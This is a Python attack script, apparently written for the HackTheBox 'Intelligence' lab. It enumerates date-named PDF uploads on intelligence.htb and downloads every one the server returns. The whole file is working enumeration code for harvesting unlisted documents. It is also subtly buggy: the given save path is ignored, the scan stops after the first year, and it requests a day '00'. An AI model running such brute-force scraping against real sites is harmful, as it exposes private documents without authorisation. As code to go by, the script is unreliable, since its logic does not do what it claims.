#!/usr/bin/python3

import requests
import sys

doc_total = 0
   
if len(sys.argv) != 2:
    print("[-] No path for saving files was given.")
    print("Usage: script.py /path/to/save/")
    sys.exit()

target = "http://intelligence.htb/documents/"
saveToPath = sys.argv[1]

def docLoader():
    
    try:
        for years in range(0,2):      
                for month in range(1,13):
                    r = requests.get(target + "202" + str(years) + "-" + str(month).zfill(2) + "-01-upload.pdf" )
                    doc = "202" + str(years) + "-"  + str(month).zfill(2) + "-01-upload.pdf"
                    print(f"[+] Scanning {doc}" , sep='\n', end='\r', flush=True)

                    if r.status_code == 200:                        
                        with open(doc, 'wb') as f:
                            f.write(r.content)
                            global doc_total
                            doc_total += 1
                            print(f"[+] Document {doc} found")

                    for days in range(0,32):
                            r = requests.get(target + "202" + str(years) + "-" + str(month).zfill(2) + "-" + str(days).zfill(2) + "-upload.pdf" )
                            doc = "202" + str(years) + "-"  + str(month).zfill(2) + "-" + str(days).zfill(2) + "-upload.pdf"
                            print(f"[+] Scanning {doc}", sep='\n', end='\r', flush=True)

                            if r.status_code == 200:                        
                                with open(doc, 'wb') as f:
                                    f.write(r.content)
                                    doc_total += 1
                                    print(f"[+] Document {doc} found")
                else:
                    continue
                return doc_total
                            
    except KeyboardInterrupt:
            print("\n")
            print(f"[-] Exiting script")
            print(f"[+] {doc_total} documents were successfully downloaded to {sys.argv[1]} ")
            sys.exit()

    except requests.ConnectionError:
            print(f"[+] Hostname could not be reached")
            sys.exit()

docLoader()
#Summary of all downloaded files
print(f"[+] {doc_total} documents were successfully downloaded to {sys.argv[1]} ")